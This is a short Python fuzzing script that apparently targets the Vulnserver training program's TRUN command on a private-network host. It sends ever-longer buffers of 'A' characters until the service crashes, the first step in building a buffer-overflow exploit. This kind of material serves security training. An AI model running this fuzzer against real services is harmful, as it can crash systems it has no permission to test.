#!/usr/bin/python
 
import sys, socket
from time import sleep
 
buffer = "A" * 100
 
while True:
    try:
        payload = "TRUN /.:/" + buffer
 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.1.100',9999))
        except Exception as e:
            print(e)
            sys.exit(1)
        print ("[+] Sending the payload...\n" + str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)
        buffer = buffer + "A"*100
    except Exception as e:
        print(e)
        print ("The fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()        